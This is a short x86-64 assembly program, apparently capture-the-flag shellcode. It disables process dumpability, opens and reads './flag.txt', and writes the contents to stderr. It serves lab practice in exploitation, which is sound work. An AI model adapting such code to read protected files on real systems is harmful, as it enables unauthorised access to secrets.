section .text
global _start

; another version
_start:
	; open(filename, O_RDONLY)
	mov rdi, filename2
	mov rsi, 0x0
	mov rax, 2
	syscall
	
	mov rdi, 4 ; PR_SET_DUMPABLE
	mov rsi, 0 ; SUID_DUMP_DISABLE
	mov rax, 157
	syscall

	; open(filename, O_RDONLY)
	mov rdi, filename
	mov rsi, 0x0
	mov rax, 2
	syscall

	; read(fd, flag_data, 0x64)
	mov rdi, rax
	mov rsi, flag_data
	mov rdx, 0x64
	mov rax, 0
	syscall

	; write(2, flag_data, 0x64)
	mov rdi, 2
	mov rsi, flag_data
	mov rdx, 0x64
	mov rax, 1
	syscall

    mov rdi, 55
    mov rax, 0x3c
    syscall


section .data
    filename db "./flag.txt", 0x0
    filename2 db "asdf.txt", 0x0
	flag_data times 0x64 db 0

